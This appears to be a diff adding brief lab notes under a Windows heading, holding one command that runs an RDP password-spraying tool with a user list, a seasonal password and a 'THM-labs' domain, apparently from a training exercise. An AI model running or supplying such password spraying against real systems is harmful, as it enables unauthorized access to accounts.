@@ -1,0 +1,5 @@
+### windows ###
+
+
+python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-labs -T RDP_servers.txt
+
